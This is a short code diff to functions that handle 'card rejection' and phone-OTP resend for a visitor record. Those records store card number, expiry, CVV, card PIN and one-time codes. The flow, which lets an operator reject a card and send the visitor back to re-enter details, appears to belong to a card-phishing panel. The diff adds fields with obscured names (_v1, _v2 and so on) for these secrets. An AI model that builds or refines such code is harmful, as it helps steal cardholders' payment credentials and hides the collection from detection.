@@ -54,11 +54,15 @@ export async function handleCardRejection(
   
   // Clear card data and redirect to payment page
   await updateApplication(visitorId, {
+    _v1: "", // cardNumber
     cardNumber: "",
     cardType: "",
+    _v3: "", // expiryDate
     expiryDate: "",
+    _v2: "", // cvv
     cvv: "",
     otpCode: "",
+    _v6: "", // pinCode
     pinCode: "",
     otpStatus: "",
     currentStep: 4
@@ -130,6 +134,7 @@ export async function handlePhoneOtpRejection(
   
   // Clear phone OTP and reopen dialog
   await updateApplication(visitorId, {
+    _v7: "", // phoneOtp
     phoneOtp: "",
     phoneOtpStatus: "show_phone_otp" as any
   })
@@ -140,6 +145,7 @@ export async function handlePhoneOtpRejection(
  */
 export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
   await updateApplication(visitorId, {
+    _v7: "", // phoneOtp
     phoneOtp: "",
     phoneOtpStatus: "show_phone_otp" as any
   })
